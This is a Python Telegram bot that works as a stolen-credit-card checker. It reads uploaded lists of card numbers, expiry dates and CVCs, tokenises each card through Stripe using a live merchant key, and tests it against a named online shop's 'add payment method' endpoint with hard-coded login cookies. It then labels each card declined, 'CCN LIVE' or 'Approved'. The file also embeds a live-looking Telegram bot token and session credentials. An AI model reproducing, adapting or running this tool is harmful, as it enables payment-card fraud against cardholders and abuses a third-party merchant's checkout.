import requests
import concurrent.futures
import time
import os
import telebot
from telebot.types import Message, Document

# Telegram Bot Token (replace with your actual bot token)
TELEGRAM_BOT_TOKEN = '7034550037:AAElgn0B42bzQlSroin7Xpijuk4rn7Q1Ofg'

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# Function to get payment method from Stripe
def get_payment_method(card_number, exp_month, exp_year, cvc):
    headers = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "priority": "u=1, i",
        "referer": "https://js.stripe.com/",
        "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    }

    data = (
        f"billing_details[name]=+&billing_details[email]=elonklark0%40gmail.com&billing_details[address][country]=BD"
        f"&type=card&card[number]={card_number}&card[cvc]={cvc}&card[exp_year]={exp_year}&card[exp_month]={exp_month}"
        f"&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F89bde95bba%3B+stripe-js-v3%2F89bde95bba%3B+payment-element"
        f"&referrer=https%3A%2F%2Fthesilverdragonfly.com.au&time_on_page=15869&client_attribution_metadata[client_session_id]=326e8ee6-a210-4510-a07a-17ca124fcd80"
        f"&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element"
        f"&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred"
        f"&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=2f356027-038a-4152-998a-6d77015f39f3f7ac1f"
        f"&muid=06c60269-f169-4b16-a8a4-3a544ee25a710572cc&sid=aed5a8ef-9cc9-4580-91e3-911c899da23a908803"
        f"&key=pk_live_iBIpeqzKOOx2Y8PFCRBfyMU000Q7xVG4Sn&_stripe_account=acct_1PHJTKCN5rv75a4x"
    )

    response = requests.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data)
    return response.json().get("id"), response.json()

# Function to process each card
def process_card(card):
    card_details = card.strip().split("|")
    if len(card_details) != 4:
        return f"Error: Incorrect card format for card {card}"

    card_number, exp_month, exp_year, cvc = card_details

    # Get payment method id from Stripe
    payment_method_id, response_json = get_payment_method(card_number, exp_month, exp_year, cvc)

    if not payment_method_id:
        return f"{card_number}|{exp_month}|{exp_year}|{cvc} >>> Error: Failed to get payment method"

    # Payload (multipart form data)
    payload = f"""
------WebKitFormBoundarydRWE9QSdJHuTzLsJ
Content-Disposition: form-data; name="action"

create_setup_intent
------WebKitFormBoundarydRWE9QSdJHuTzLsJ
Content-Disposition: form-data; name="wcpay-payment-method"

{payment_method_id}
------WebKitFormBoundarydRWE9QSdJHuTzLsJ
Content-Disposition: form-data; name="_ajax_nonce"

ff133d4396
------WebKitFormBoundarydRWE9QSdJHuTzLsJ--
"""

    # Send POST request
    response = requests.post(url, headers=headers, data=payload)

    # Print appropriate response message with full card details
    response_text = response.text.lower()
    if 'your card was declined' in response_text:
        return f'{card_number}|{exp_month}|{exp_year}|{cvc} >>> Your card was declined ❌'
    elif 'your card number is incorrect' in response_text:
        return f'{card_number}|{exp_month}|{exp_year}|{cvc} >>> Your card number is incorrect ❌'
    elif "your card's security code is invalid" in response_text:
        return f'{card_number}|{exp_month}|{exp_year}|{cvc} >>> CCN LIVE ✅'
    else:
        return f'{card_number}|{exp_month}|{exp_year}|{cvc} >>> Approved ✅'

# Request URL
url = "https://thesilverdragonfly.com.au/wp-admin/admin-ajax.php"

# Headers
headers = {
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9",
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarydRWE9QSdJHuTzLsJ",
    "Cookie": (
        "wordpress_sec_317c3019aa82554ce123784bc9625066=elonklark0%7C1729924473%7CClFPmEepx5LiX12SHPVDqajEcUgsMKK8ZqpmK4XFRv4%7C75c7f99db068a52e61dfb3f30f728b1a3f363c1a649453ca448f0136644d7b62; "
        "sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-12%2006%3A34%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fthesilverdragonfly.com.au%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; "
        "sbjs_first_add=fd%3D2024-10-12%2006%3A34%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fthesilverdragonfly.com.au%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; "
        "sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; "
        "sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; "
        "sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Safari%2F537.36; "
        "wordpress_logged_in_317c3019aa82554ce123784bc9625066=elonklark0%7C1729924473%7CClFPmEepx5LiX12SHPVDqajEcUgsMKK8ZqpmK4XFRv4%7C2150a30be12f853fd47643b74160c5256807bd38f542b79ddc2b0cd8baafecef; "
        "wfwaf-authcookie-e859a8c1baf67417433d5b6363e362e4=9%7Cother%7Cread%7Cc71ff597b3905f7aab70070ed053ae819c63d0533f021ff61d7a6083165a227a; "
        "__stripe_mid=06c60269-f169-4b16-a8a4-3a544ee25a710572cc; "
        "__stripe_sid=aed5a8ef-9cc9-4580-91e3-911c899da23a908803; "
        "sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fthesilverdragonfly.com.au%2Fmy-account%2Fadd-payment-method%2F"
    ),
    "Origin": "https://thesilverdragonfly.com.au",
    "Referer": "https://thesilverdragonfly.com.au/my-account/add-payment-method/",
    "Sec-CH-UA": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
    "Sec-CH-UA-Mobile": "?0",
    "Sec-CH-UA-Platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
}

# Telegram bot handlers
@bot.message_handler(commands=['start'])
def send_welcome(message: Message):
    bot.reply_to(message, "Hello! Send me a file containing card details, and I will start processing them.")

@bot.message_handler(content_types=['document'])
def handle_file(message: Message):
    if message.document.mime_type == 'text/plain':
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        file_path = os.path.join(".", message.document.file_name)
        with open(file_path, 'wb') as new_file:
            new_file.write(downloaded_file)
        try:
            with open(file_path, "r", encoding="utf-8-sig") as f:
                cards = f.readlines()
        except FileNotFoundError:
            bot.reply_to(message, "Error: File not found.")
            return

        bot.reply_to(message, "File received. Starting card checks...")
        with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
            for i in range(0, len(cards), 3):
                batch = cards[i:i+3]
                futures = [executor.submit(process_card, card) for card in batch]
                for future in concurrent.futures.as_completed(futures):
                    result = future.result()
                    bot.send_message(message.chat.id, result)
                time.sleep(5)  # Adding delay between batches to control the request rate

# Main function to start the bot
if __name__ == "__main__":
    bot.polling(none_stop=True)